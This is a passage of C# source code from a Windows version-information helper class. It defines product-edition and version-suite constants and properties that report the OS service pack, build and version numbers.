        private const int PRODUCT_SMALLBUSINESS_SERVER_PREMIUM = 0x00000019;
        private const int PRODUCT_HOME_PREMIUM_N = 0x0000001A;
        private const int PRODUCT_ENTERPRISE_N = 0x0000001B;
        private const int PRODUCT_ULTIMATE_N = 0x0000001C;
        private const int PRODUCT_WEB_SERVER_CORE = 0x0000001D;
        private const int PRODUCT_MEDIUMBUSINESS_SERVER_MANAGEMENT = 0x0000001E;
        private const int PRODUCT_MEDIUMBUSINESS_SERVER_SECURITY = 0x0000001F;
        private const int PRODUCT_MEDIUMBUSINESS_SERVER_MESSAGING = 0x00000020;
        private const int PRODUCT_SERVER_FOUNDATION = 0x00000021;
        private const int PRODUCT_HOME_PREMIUM_SERVER = 0x00000022;
        private const int PRODUCT_SERVER_FOR_SMALLBUSINESS_V = 0x00000023;
        private const int PRODUCT_STANDARD_SERVER_V = 0x00000024;
        private const int PRODUCT_DATACENTER_SERVER_V = 0x00000025;
        private const int PRODUCT_ENTERPRISE_SERVER_V = 0x00000026;
        private const int PRODUCT_DATACENTER_SERVER_CORE_V = 0x00000027;
        private const int PRODUCT_STANDARD_SERVER_CORE_V = 0x00000028;
        private const int PRODUCT_ENTERPRISE_SERVER_CORE_V = 0x00000029;
        private const int PRODUCT_HYPERV = 0x0000002A;
        private const int PRODUCT_STORAGE_EXPRESS_SERVER_CORE = 0x0000002B;
        private const int PRODUCT_STORAGE_STANDARD_SERVER_CORE = 0x0000002C;
        private const int PRODUCT_STORAGE_WORKGROUP_SERVER_CORE = 0x0000002D;
        private const int PRODUCT_STORAGE_ENTERPRISE_SERVER_CORE = 0x0000002E;
        private const int PRODUCT_STARTER_N = 0x0000002F;
        private const int PRODUCT_PROFESSIONAL = 0x00000030;
        private const int PRODUCT_PROFESSIONAL_N = 0x00000031;
        private const int PRODUCT_SB_SOLUTION_SERVER = 0x00000032;
        private const int PRODUCT_SERVER_FOR_SB_SOLUTIONS = 0x00000033;
        private const int PRODUCT_STANDARD_SERVER_SOLUTIONS = 0x00000034;
        private const int PRODUCT_STANDARD_SERVER_SOLUTIONS_CORE = 0x00000035;
        private const int PRODUCT_SB_SOLUTION_SERVER_EM = 0x00000036;
        private const int PRODUCT_SERVER_FOR_SB_SOLUTIONS_EM = 0x00000037;
        private const int PRODUCT_SOLUTION_EMBEDDEDSERVER = 0x00000038;
        private const int PRODUCT_SOLUTION_EMBEDDEDSERVER_CORE = 0x00000039;
        private const int PRODUCT_ESSENTIALBUSINESS_SERVER_MGMT = 0x0000003B;
        private const int PRODUCT_ESSENTIALBUSINESS_SERVER_ADDL = 0x0000003C;
        private const int PRODUCT_ESSENTIALBUSINESS_SERVER_MGMTSVC = 0x0000003D;
        private const int PRODUCT_ESSENTIALBUSINESS_SERVER_ADDLSVC = 0x0000003E;
        private const int PRODUCT_SMALLBUSINESS_SERVER_PREMIUM_CORE = 0x0000003F;
        private const int PRODUCT_CLUSTER_SERVER_V = 0x00000040;
        private const int PRODUCT_EMBEDDED = 0x00000041;
        private const int PRODUCT_STARTER_E = 0x00000042;
        private const int PRODUCT_HOME_BASIC_E = 0x00000043;
        private const int PRODUCT_HOME_PREMIUM_E = 0x00000044;
        private const int PRODUCT_PROFESSIONAL_E = 0x00000045;
        private const int PRODUCT_ENTERPRISE_E = 0x00000046;
        private const int PRODUCT_ULTIMATE_E = 0x00000047;
        private const int PRODUCT_ENTERPRISE_EVALUATION = 0x00000048;
        private const int PRODUCT_MULTIPOINT_STANDARD_SERVER = 0x0000004C;
        private const int PRODUCT_MULTIPOINT_PREMIUM_SERVER = 0x0000004D;
        private const int PRODUCT_STANDARD_EVALUATION_SERVER = 0x0000004F;
        private const int PRODUCT_DATACENTER_EVALUATION_SERVER = 0x00000050;
        private const int PRODUCT_ENTERPRISE_N_EVALUATION = 0x00000054;
        private const int PRODUCT_EMBEDDED_AUTOMOTIVE = 0x00000055;
        private const int PRODUCT_EMBEDDED_INDUSTRY_A = 0x00000056;
        private const int PRODUCT_THINPC = 0x00000057;
        private const int PRODUCT_EMBEDDED_A = 0x00000058;
        private const int PRODUCT_EMBEDDED_INDUSTRY = 0x00000059;
        private const int PRODUCT_EMBEDDED_E = 0x0000005A;
        private const int PRODUCT_EMBEDDED_INDUSTRY_E = 0x0000005B;
        private const int PRODUCT_EMBEDDED_INDUSTRY_A_E = 0x0000005C;
        private const int PRODUCT_STORAGE_WORKGROUP_EVALUATION_SERVER = 0x0000005F;
        private const int PRODUCT_STORAGE_STANDARD_EVALUATION_SERVER = 0x00000060;
        private const int PRODUCT_CORE_ARM = 0x00000061;
        private const int PRODUCT_CORE_N = 0x00000062;
        private const int PRODUCT_CORE_COUNTRYSPECIFIC = 0x00000063;
        private const int PRODUCT_CORE_SINGLELANGUAGE = 0x00000064;
        private const int PRODUCT_CORE = 0x00000065;
        private const int PRODUCT_PROFESSIONAL_WMC = 0x00000067;
        #endregion PRODUCT

        #region VERSIONS
        private const int VER_NT_WORKSTATION = 1;
        private const int VER_NT_DOMAIN_CONTROLLER = 2;
        private const int VER_NT_SERVER = 3;
        private const int VER_SUITE_SMALLBUSINESS = 1;
        private const int VER_SUITE_ENTERPRISE = 2;
        private const int VER_SUITE_TERMINAL = 16;
        private const int VER_SUITE_DATACENTER = 128;
        private const int VER_SUITE_SINGLEUSERTS = 256;
        private const int VER_SUITE_PERSONAL = 512;
        private const int VER_SUITE_BLADE = 1024;
        #endregion VERSIONS
        #endregion PINVOKE

        #region SERVICE PACK
        /// <summary>
        /// Gets the service pack information of the operating system running on this computer.
        /// </summary>
        static public string ServicePack
        {
            get
            {
                string servicePack = String.Empty;
                OSVERSIONINFOEX osVersionInfo = new OSVERSIONINFOEX();

                osVersionInfo.dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEX));

                if (GetVersionEx(ref osVersionInfo))
                {
                    servicePack = osVersionInfo.szCSDVersion;
                }

                return servicePack;
            }
        }
        #endregion SERVICE PACK

        #region VERSION
        #region BUILD
        /// <summary>
        /// Gets the build version number of the operating system running on this computer.
        /// </summary>
        static public int BuildVersion
        {
            get
            {
                return Environment.OSVersion.Version.Build;
            }
        }
        #endregion BUILD

        #region FULL
        #region STRING
        /// <summary>
        /// Gets the full version string of the operating system running on this computer.
        /// </summary>
        static public string VersionString
        {
            get
            {
                return Environment.OSVersion.Version.ToString();
            }
        }
        #endregion STRING

        #region VERSION
        /// <summary>
        /// Gets the full version of the operating system running on this computer.
        /// </summary>
        static public Version Version
        {
            get
            {
                return Environment.OSVersion.Version;
            }
        }
        #endregion VERSION
        #endregion FULL

        #region MAJOR
        /// <summary>
        /// Gets the major version number of the operating system running on this computer.
        /// </summary>
        static public int MajorVersion
        {
            get
            {
                return Environment.OSVersion.Version.Major;
            }
        }
        #endregion MAJOR

        #region MINOR
        /// <summary>
        /// Gets the minor version number of the operating system running on this computer.
        /// </summary>
        static public int MinorVersion
        {
            get
            {
                return Environment.OSVersion.Version.Minor;
            }
        }
        #endregion MINOR

        #region REVISION
        /// <summary>
        /// Gets the revision version number of the operating system running on this computer.
        /// </summary>
        static public int RevisionVersion
        {
            get
            {
                return Environment.OSVersion.Version.Revision;
            }
        }
        #endregion REVISION
        #endregion VERSION
    }
}
